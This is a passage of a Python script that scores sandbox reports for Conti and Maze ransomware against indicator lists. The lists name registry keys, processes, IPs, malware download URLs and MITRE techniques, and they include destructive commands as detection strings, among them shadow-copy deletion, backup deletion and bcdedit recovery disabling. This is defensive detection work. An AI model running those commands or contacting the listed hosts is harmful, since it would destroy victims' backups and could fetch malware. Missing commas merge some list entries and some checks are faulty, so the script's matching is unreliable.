        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
        r"HKLM\SYSTEM\CurrentControlSet\Services",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    ]

    # Check for suspicious process names associated with CONTI
    SUSPICIOUS_PROCESS_NAMES = ["readme.dll","srv.txt","wm_start.bat","copy_files_srv.bat","rclone.exe","README.txt","ShellExperienceHost.exe","net.exe","conti_readme.txt", "taskdl.exe", "cobaltstrike.exe", "powershell.exe", "rundll32.exe", "wscript.exe", "lsass.exe", "svchost.exe", "explorer.exe", "spoolsv.exe","crypt32.dll","bcrypt.dll","ncrypt.dll","CRYPTBASE.dll","CRYPTSP.dll"]
    PATH_RANSOMWARE = [r"c:\windows\192145.dll,StartW",r"C:\Windows\System32\dllhost.exe 	",r"C:\Users\USER\AppData\Local\Temp\icju1.exe 	",r"C:\Windows\System32\dllhost.exe","%CONHOST%","C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll","C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\","C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\"]
    power_shell_cmd = ["cmd.exe /C portscan","cmd.exe /C wmic /node:","C:\Programdata\sys.dll entryPoint",
                        "cmd.exe /C nltest /dclist:","cmd.exe /C net group “domain Admins” /domain",
                        "cmd.exe /C nltest /DOMAIN_TRUSTS","cmd.exe /C adft.bat","cmd.exe /C type shares.txt",
                        "cmd.exe /c %windir%\\System32\\wbem\\WMIC.exe shadowcopy where","%windir%\\System32\\wbem\\WMIC.exe  shadowcopy where"]

    # Check for suspicious network connections associated with CONTI
    SUSPICIOUS_NETWORK_IPS = ["68.183.20.194","83.97.20.160","159.89.140.116","192.99.178.145","23.106.160.174","162.244.80.235","85.93.88.165","185.141.63.120","82.118.21.1","1.177.172.158","104.244.76.44","122.51.149.86","176.9.1.211","176.9.98.228","18.27.197.252","185.130.44.108","185.220.103.4","2.82.175.32","217.160.251.63","218.92.0.211","45.153.160.134","46.101.236.25","49.234.143.71","51.75.171.136","54.36.108.162","6.11.76.81","61.177.172.158","64.113.32.29","66.211.197.38"]
    SUSPICIOUS_NETWORK_PORT = [22,135,443,445,1433,1434,3389,4343,5000,5985,5355]
    URLS_SUSPECTS = ["dimentos.com","thulleultinn.club","dictorecovery.cyou","expertulthima.club","vaclicinni.xyz","oxythuler.cyou","docns.com/OrderEntryService.asmx/AddOrderLine","Docns.com/us/ky/louisville/312-s-fourth-st.html",'badiwaw.com', 'balacif.com', 'barovur.com', 'basisem.com', 'bimafu.com', 'bujoke.com', 'buloxo.com', 'bumoyez.com', 'bupula.com', 'fipoleb.com', 'fofudir.com', 'fulujam.com', 'ganobaz.com', 'gerepa.com', 'gucunug.com', 'guvafe.com', 'hakakor.com', 'hejalij.com', 'kipitep.com', 'kirute.com', 'kogasiv.com', 'kozoheh.com', 'kuxizi.com', 'kuyeguh.com', 'lipozi.com', 'lujecuk.com', 'masaxoc.com', 'pihafi.com', 'pilagop.com', 'pipipub.com', 'pofifa.com', 'radezig.com', 'raferif.com', 'ragojel.com', 'rexagi.com', 'rimurik.com', 'tiyuzub.com', 'tubaho.com', 'vafici.com', 'vegubu.com', 'vigave.com', 'vipeced.com', 'vizosi.com', 'vojefe.com', 'vonavu.com', 'cajeti.com', 'cilomum.com', 'codasal.com', 'comecal.com', 'dawasab.com', 'derotin.com', 'dihata.com', 'dirupun.com', 'dohigu.com', 'dubacaj.com', 'fecotis.com', 'hepide.com', 'hesovaw.com', 'hewecas.com', 'hidusi.com', 'hireja.com', 'hoguyum.com', 'jecubat.com', 'jegufe.com', 'joxinu.com', 'kelowuh.com', 'kidukes.com', 'mebonux.com', 'mihojip.com', 'modasum.com', 'moduwoj.com', 'movufa.com', 'nagahox.com', 'nawusem.com', 'nerapo.com', 'newiro.com', 'paxobuy.com', 'pazovet.com', 'rinutov.com', 'rusoti.com', 'sazoya.com', 'sidevot.com', 'solobiv.com', 'sufebul.com', 'suhuhow.com', 'sujaxa.com', 'tafobi.com', 'tepiwo.com', 'tifiru.com', 'wezeriw.com', 'wideri.com', 'wudepen.com', 'wuluxo.com', 'wuvehus.com', 'wuvici.com', 'wuvidi.com', 'xegogiv.com', 'xekezix.com']
    NT_DETECTED = ["locked","decrypt","encrypted by conti","Need restore files?"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in CONTI_REGISTRY_KEYS:
                if j in i:
                    total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i["name"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in CONTI_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in CONTI_REGISTRY_KEYS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in NT_DETECTED:
                            if l.lower() in k.lower():
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l.lower() in k.lower():
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        
        for i in dictionary["data"]["modules_loaded"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0

    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0

    # mutexes created
    try :
        
        for i in dictionary["data"]["mutexes_created"]:
            if "_CONTI_" in i or "\\Sessions\\1\\BaseNamedObjects\\_CONTI_" in i:
                total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            if "_CONTI_" in i or "\\Sessions\\1\\BaseNamedObjects\\_CONTI_" in i:
                total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "CONTI" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["text_decoded"]))+"/"+str(total))
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1

        #print("Total files_opened est : "+str(len(dictionary["data"]["files_opened"]))+"/"+str(total))
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in CONTI_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in CONTI_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["TA0004","TA0006","TA0007","TA0011","TA0010","T1016","T1018","T1021.002","T1027","T1049","T1055.001","T1057","T1059","T1059.003","T1078","T1080","T1083","T1106","T1110","T1133","T1135","T1140","T1190","T1486"
                            "T1489","T1490","T1558.003","T1566.001","T1566.002","T1567"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    try :
        
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in CONTI_EXTENSIONS:
                if j in i["destination"]:
                    total += 1
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in CONTI_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in CONTI_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in NT_DETECTED:
                        if k in i[j]:
                            total += 1
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0

    # Calculate the probs
    #print("[Conti] ~ La somme de tout est : "+str(total))
    return total

def check_for_maze_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by MAZE
    MAZE_EXTENSIONS = [".maze",".ILnnD"]
    
    # List of common registry keys modified by MAZE
    MAZE_REGISTRY_KEYS = [
        "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\TRACING\\0036407552_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASMANCS",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASAPI32",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASMANCS",
        r"HKEY_CURRENT_USER\Software[random_name]",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\UserChoice\Progid",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithList",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithProgids",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Rpc",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
        "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM\\Software\\Microsoft\\Cryptography",
        "HKLM\\Software\\Policies\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        "HKLM\\Software\\Microsoft\\Cryptography\\Offload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winsock\\Setup Migration\\Providers\\Tcpip6"
    ]
    
    TERMES = ["top secret","Important confidential","Important equipment","Interior Pictures","Legal Affairs"]

    # Check for suspicious process names associated with MAZE
    SUSPICIOUS_PROCESS_NAMES = ["m.exe","Taschost.exe","u0441host.exe","int32.dll","psexec.exe","Invoice_29557473.exe","windef.exe","win163.65.tmp",
                                "winupd.tmp","officeupd.tmp","mswordupd.tmp","dospizdos.tmp","wordupd.tmp","wordupd_3.0.1.tmp","srv.txt",
                                "wm_start.bat","copy_files_srv.bat","rclone.exe","README.txt","ShellExperienceHost.exe","net.exe",
                                "MAZE_readme.txt", "taskdl.exe", "cobaltstrike.exe", "powershell.exe","cmd.exe", "rundll32.exe", "wscript.exe", 
                                "lsass.exe", "svchost.exe", "explorer.exe", "spoolsv.exe","crypt32.dll","bcrypt.dll","ncrypt.dll","CRYPTBASE.dll",
                                "wuapihost.exe","WMIC.exe","conhost.exe","CRYPTSP.dll","rpcrt4.dll","Maze.exe","sc.exe","svc.exe","winlogon.exe",
                                "wermgr.exe","rdpclip.exe","wininit.exe","regsvr32.exe","explorer.exe","wininet.dll","userinit.dll","wuauclt.exe",
                                "winrm.vbs","spoolsv.exe","logonui.exe","backup.exe","msvcrt.dll","RpcRtRemote.dll","rasapi32.dll","rasman.dll",
                                "DECRYPT-FILES.txt","wmiprvse.exe","decrypt-files.html"]
    PATH_RANSOMWARE = [r"%APPDATA%\teamviewers\msi.dll",r"c:\windows\192145.dll,StartW",r"C:\Windows\System32\dllhost.exe",
                    r"C:\Users\USER\AppData\Local\Temp\icju1.exe",r"C:\Windows\System32\dllhost.exe","%CONHOST%"
                    "C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll",
                    "C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\",
                    "C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\",
                    "${SamplePath}\\"]
    power_shell_cmd = ["cmd.exe /c schtasks /create /sc minute /mo 1 /tn shadowdev /tr",
                    "cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\SOFTWARE\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t REG_DWORD /d 3045 & exit",
                    "cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\SOFTWARE\\YkUJvbgwtylk /v KYIaIoYxqwO /t REG_DWORD /d 9633 & exit",
                    "WMIC.exe  SHADOWCOPY /nointeractive","wbadmin DELETE SYSTEMSTATEBACKUP","wbadmin DELETE SYSTEMSTATEBACKUP - deleteOldest",
                    "bcdedit /set {default} recoveryenabled No","bcdedit /set {default} bootstatuspolicy ignoreallfailures","vssadmin.exe Delete Shadows /All /Quiet"
                    ]
    # UNC2198
    # Check for suspicious network connections associated with MAZE
    SUSPICIOUS_NETWORK_IPS = ["5.149.253.199","23.227.193.167","195.123.240.219","193.34.167.34","149.28.201.253","79.141.166.158","45.141.84.223","45.141.84.212","5.199.167.188","37.252.7.142","37.1.213.9","193.36.237.173","173.209.43.61","91.218.114.11","91.218.114.25","91.218.114.26","91.218.114.31","91.218.114.32","91.218.114.37","91.218.114.38","91.218.114.4","91.218.114.77","91.218.114.79","92.63.11.151","92.63.15.6","92.63.15.8","92.63.17.245","92.63.194.20","92.63.194.3","92.63.29.137","92.63.32.2","92.63.32.52","92.63.32.55","92.63.32.57","92.63.37.100","92.63.8.47"]
    SUSPICIOUS_NETWORK_PORT = [21,22,135,443,445,1433,1434,3389,4343,5000,5985,5355,8079,25055,4132,4124,4114]
    URLS_SUSPECTS = ["airmail.cc","lilith.com","U.Awf.Aw","june85.cyou","golddisco.top","colosssueded.top","colombosuede.club","att-customer.com","att-information.com","att-newsroom.com","att-plans.com","bezahlen-1und1.icu","bzst-info.icu","bzst-inform.icu","bzstinfo.icu",
                    "bzstinform.icu","canada-post.icu","canadapost-delivery.icu","canadapost-tracking.icu","hilfe-center-1und1.icu","hilfe-center-internetag.icu","trackweb-canadapost.icu",
                    "updates.updatecenter.icu","thesawmeinrew.net","plaintsotherest.net","drivers.updatecenter.icu","checksoffice.me","aoacugmutagkwctu.onion","mazedecrypt.top","mazenews.top","newsmaze.top","http://104.168.174.32/wordupd_3.0.1.tmp","http://104.168.198.208/wordupd.tmp","http://104.168.198.208/dospizdos.tmp","http://104.168.201.47/wordupd.tmp",
                    "http://104.168.215.54/wordupd.tmp","http://149.56.245.196/wordupd.tmp","http://192.119.106.235/mswordupd.tmp","http://192.119.106.235/officeupd.tmp","http://192.99.172.143/winupd.tmp","http://54.39.233.188/win163.65.tmp","http://91.208.184.174/windef.exe",
                    "http://agenziainformazioni.icu/wordupd.tmp","http://www.download-invoice.site/Invoice_29557473.exe"]
    NT_DETECTED = ["locked","decrypt","encrypted by MAZE","Need restore files?"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in MAZE_REGISTRY_KEYS:
                if j in i:
                    if j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\":
                        if ".exe" in j:
                            total += 1
                        else:
                            total += 0
                    else:
                        total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0
    

    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i["name"]:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in MAZE_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in MAZE_REGISTRY_KEYS:
                            if l in k:
                                total += 1
                        for l in NT_DETECTED:
                            if l in k:
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l in k:
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        for i in dictionary["data"]["modules_loaded"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0

    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_ips
    try :
        for i in dictionary["data"]["memory_pattern_ips"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # mutexes created
    mutex = [r"Global\MsWinZonesCacheCounterMutexA",r"Global\MsWinZonesCacheCounterMutexB",r"Global\RPCSS_ServiceMutex",
            r"Global\csrss.exe",r"Global\Device_Udp_Writer_Lock","Global\\"]
    try :
        for i in dictionary["data"]["mutexes_created"]:
            for j in mutex:
                if j in i:
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            for j in mutex:
                if j in i:
                    total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "MAZE" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in MAZE_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in MAZE_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1133","T1078","T1059","T1086","T1064","T1035","T1050","T1036","T1027","T1110","T1003","T1087","T1482","T1032"
                            "T1083","T1135","T1069","T1016","T1018","T1076","T1105","T1005","T1043","T1071","T1002","T1048","T1486","T1020"
                            "T1489","T1193","T1085","T1204","T1028","T1136","T1140","T1107","T1081","T1171","T1033","T1074","T1039","T1219",
